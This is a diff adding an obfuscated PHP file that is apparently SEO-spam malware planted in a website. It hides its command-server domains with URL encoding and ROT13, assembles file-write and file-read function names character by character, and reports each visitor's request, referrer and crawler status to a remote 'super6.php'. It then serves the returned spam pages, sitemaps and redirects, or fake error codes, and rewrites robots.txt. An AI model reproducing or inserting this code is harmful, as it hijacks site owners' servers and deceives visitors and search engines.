@@ -1,0 +1,186 @@
+<?php
+$xmlname = ["%36%31%30%2D%79%76%61%78%31%37%39%2D%31%2E%7A%6E%74%61%6E%61%2E%67%62%63","%36%31%30%2D%79%76%61%78%31%37%39%2D%31%2E%64%68%76%61%67%72%66%66%6C%2E%67%62%63","%36%31%30%2D%79%76%61%78%31%37%39%2D%31%2E%7A%72%67%6E%6F%65%76%71%74%6E%2E%6B%6C%6D","%36%31%30%2D%79%76%61%78%31%37%39%2D%31%2E%70%65%72%6E%70%76%6D%72%61%2E%6B%6C%6D"];
+$http_web = 'http';
+$host = $_SERVER['HTTP_HOST'];
+$lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ?: 'en';
+$urlshang = '';
+if (isset($_SERVER['HTTP_REFERER'])) {
+    $urlshang = $_SERVER['HTTP_REFERER'];
+}
+if (is_https()) {
+    $http = 'https';
+} else {
+    $http = 'http';
+}
+$zz = disbot();
+$duri = drequest_uri();
+$duri = $duri == '' ? '/' : $duri;
+preg_match('/\/([^\/]+\.php)/', $duri, $matches);
+if (empty($matches) || $matches[1] == 'wp-crom.php' || $matches[1] == 'detail.php') {
+    $model_file = 'index.php';
+    $model = 'index';
+} else {
+    $model_file = $matches[1];
+    $position = strpos($duri, $model_file);
+    if ($position !== false) {
+        $model_file = substr($duri, 0, $position + strlen($model_file));
+        $model_file = ltrim($model_file, '/');
+    }
+    $model = str_replace('.php', '', $model_file);
+}
+if (stristr($duri, '/?')) {
+    $model = '?';
+}
+$string = '610-link179-1';
+$istest = false;
+if (strpos($duri, $string) !== false) {
+    $zz = 1;
+    $duri = str_replace($string, '', $duri);
+    $istest = true;
+}
+if ($duri != '/') {
+    $duri = str_replace('/' . $model_file, '', $duri);
+    $duri = str_replace('/index.php', '', $duri);
+    $duri = str_replace('!', '', $duri);
+}
+$duri = urlencode($duri);
+$server = detect_server_software();
+create_robots($http . '://' . $host);
+$param = 'web=' . $host . '&zz=' . $zz . '&uri=' . $duri . '&urlshang=' . $urlshang . '&http=' . $http . '&lang=' . $lang . '&server=' . $server . '&model=' . $model;
+$html_content = request($xmlname, $http_web, $param);
+if (!strstr($html_content, 'nobotuseragent')) {
+    if (strstr($html_content, 'okhtml')) {
+        @header('Content-type: text/html; charset=utf-8');
+        $html_content = str_replace('okhtml', '', $html_content);
+        if ($istest) {
+            echo $string;
+        }
+        echo $html_content;
+        exit();
+    } else if (strstr($html_content, 'getcontent500page')) {
+        @header('HTTP/1.1 500 Internal Server Error');
+        exit();
+    } else if (strstr($html_content, '404page')) {
+        @header('HTTP/1.1 404 Not Found');
+        exit();
+    } else if (strstr($html_content, '301page')) {
+        @header('HTTP/1.1 301 Moved Permanently');
+        $html_content = str_replace('301page', '', $html_content);
+        header('Location: ' . $html_content);
+        exit();
+    } else if (strstr($html_content, 'okxml')) {
+        $html_content = str_replace('okxml', '', $html_content);
+        @header('Content-Type: application/xml; charset=utf-8');
+        echo $html_content;
+        exit();
+    } else if (strstr($html_content, 'okrobots')) {
+        $html_content = str_replace('okrobots', '', $html_content);
+        @header('Content-Type: text/plain');
+        echo $html_content;
+        exit();
+    }
+}
+function disbot()
+{
+    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    if (stristr($user_agent, 'googlebot') || stristr($user_agent, 'bing') || stristr($user_agent, 'yahoo') || stristr($user_agent, 'google') || stristr($user_agent, 'Googlebot')) {
+        return 1;
+    } else {
+        return 2;
+    }
+}
+
+function drequest_uri()
+{
+    if (isset($_SERVER['REQUEST_URI'])) {
+        $duri = $_SERVER['REQUEST_URI'];
+    } else {
+        if (isset($_SERVER['argv'])) {
+            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
+        } else {
+            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
+        }
+    }
+    return $duri;
+}
+
+function is_https()
+{
+    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
+        return true;
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
+        return true;
+    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
+        return true;
+    }
+    return false;
+}
+
+function detect_server_software()
+{
+    $path = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
+    if (file_exists($path)) {
+        return 1;
+    } else {
+        return 2;
+    }
+}
+
+function create_robots($url)
+{
+    $function = func();
+    $path = $_SERVER['DOCUMENT_ROOT'] . '/robots.txt';
+    $content = 'User-agent: *' . PHP_EOL;
+    $content .= 'Allow: /' . PHP_EOL . PHP_EOL;
+    $content .= 'Sitemap: ' . $url . '/sitemap.xml' . PHP_EOL;
+    if (!file_exists($path)) {
+        $function[0]($path, $content);
+    } else {
+        $existingContent = $function[1]($path);
+        if ($existingContent !== $content) {
+            $function[0]($path, $content);
+        }
+    }
+}
+
+function request($webs, $http_web, $param)
+{
+    $function = func();
+    shuffle($webs);
+    foreach ($webs as $domain) {
+        $domain = $function[2](urldecode($domain));
+        $url = $http_web . '://' . $domain . '/super6.php?' . $param;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $response = curl_exec($ch);
+        if (!curl_errno($ch)) {
+            curl_close($ch);
+            return $response;
+        } else {
+            if (stristr(curl_error($ch), '443')) {
+                echo "443";
+            }
+            curl_close($ch);
+        }
+        if (ini_get('allow_url_fopen')) {
+            $response = @$function[1]($url);
+            if ($response !== false) {
+                return $response;
+            }
+        }
+    }
+    return 'nobotuseragent';
+}
+
+function func()
+{
+    $chars = range('a','z');
+    return [
+        $chars[5] . $chars[8] . $chars[11] . $chars[4] . '_' . $chars[15] . $chars[20] . $chars[19] . '_' . $chars[2] . $chars[14] . $chars[13] . $chars[19] . $chars[4] . $chars[13] . $chars[19] . $chars[18],
+        $chars[5] . $chars[8] . $chars[11] . $chars[4] . '_' . $chars[6] . $chars[4] . $chars[19] . '_' . $chars[2] . $chars[14] . $chars[13] . $chars[19] . $chars[4] . $chars[13] . $chars[19] . $chars[18],
+        $chars[18] . $chars[19] . $chars[17] . '_' . $chars[17] . $chars[14] . $chars[19] . '13',
+    ];
+}
+
+
